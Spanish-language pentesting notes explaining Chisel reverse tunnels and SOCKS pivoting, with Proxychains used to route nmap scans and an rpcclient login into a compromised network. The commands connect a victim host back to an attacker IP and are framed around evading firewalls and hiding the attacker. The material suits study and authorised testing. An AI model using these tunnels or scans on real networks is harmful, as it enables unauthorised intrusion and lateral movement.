# 🚀 Herramientas de Túneles y Proxies en Pentesting

Este documento explica el uso de **Chisel** y **Proxychains**, herramientas muy útiles para pentesting y movimientos laterales dentro de redes comprometidas.

---

# **1️⃣ Chisel**

### **Qué es**
- Chisel es una **herramienta de túneles TCP/UDP** que permite **redirigir tráfico a través de conexiones HTTP o HTTPS**.
- Muy utilizada en pentesting para **bypassear firewalls y NAT**, creando túneles entre una máquina atacante y un host comprometido.

### **Cómo funciona**
- Funciona en **modo servidor y cliente**:
  - **Servidor**: en la máquina atacante, escucha conexiones entrantes.  
  - **Cliente**: en la máquina víctima, se conecta al servidor y redirige tráfico local hacia él.

---

## **Ejemplo 1: Redirección básica de un puerto**
**Servidor (atacante):**
```bash
chisel server -p 8080 --reverse
```

En la **máquina víctima (cliente)**:

```bash
chisel client 10.0.0.5:8080 R:3389:127.0.0.1:3389
```

* Esto crea un túnel inverso, redirigiendo el **RDP (3389)** de la víctima hacia el atacante.



## Ejemplo 2: Redirección de todos los puertos (Pivoting)
En la **máquina atacante (servidor)**:

```bash
chisel server --reverse -p 4455 
```

En la maquina(victima) pivoting vamos a reenviar el trafico

```bash
chisel.exe client 10.250.1.6:4455 R:socks
```
* Esto crea un túnel SOCKS, permitiendo que el atacante redirija todo el tráfico a través de la víctima.


**Configuración de Chisel con Proxychains**
```bash
sudo nano /etc/proxychains4.conf 
```
* El puerto 1080 corresponde al proxy SOCKS que crea Chisel.
* Agrega la siguiente línea al final del archivo: 

**Se agrega la siguiente linea de configuracion**

```bash
socks5 127.0.0.1 1080
```

* Esto permite que cualquier aplicación que use Proxychains se conecte a través del túnel creado por Chisel.

**Uso típico en pentesting:**

* Acceso remoto a servicios internos de la red víctima.
* Bypass de firewalls y NAT sin abrir puertos directos.

-----

# **2️⃣ Proxychains**

**Qué es:**

* Proxychains es una **herramienta que fuerza el tráfico de una aplicación a través de proxies** (HTTP, SOCKS4/5).
* Permite **ocultar la IP del atacante** o **penetrar redes restringidas** usando un proxy intermedio.

**Cómo funciona:**

* Se configura un archivo `proxychains.conf` con proxies disponibles.
* Luego ejecutas cualquier comando con `proxychains`, y su tráfico pasará por los proxies configurados.

**Ejemplo básico:**

```bash
proxychains nmap -sT -Pn 10.0.0.0/24
```
**Ejemplo Con rpcclient**

* listar los usuario.

```bash
proxychains4 rpcclient -U 'John%VerySafePassword!' 10.200.150.10 
```

**Esto fuerza que la conexión pase por la cadena de proxies definida, protegiendo la identidad del atacante.**


## Uso típico en pentesting:

* Escanear redes internas desde un punto externo.
* Ocultar la identidad del atacante.
* Encadenar múltiples proxies para anonimato o evadir detección.

---

## Resumen rápido:

| Herramienta | Propósito principal                                | Uso típico                                    |
| ----------- | -------------------------------------------------- | --------------------------------------------- |
| Chisel      | Crear túneles TCP/UDP a través de HTTP/HTTPS       | Acceso remoto, bypass de firewalls/NAT        |
| Proxychains | Forzar tráfico de aplicaciones a través de proxies | Anonimato, evadir filtrado, pentesting remoto |

---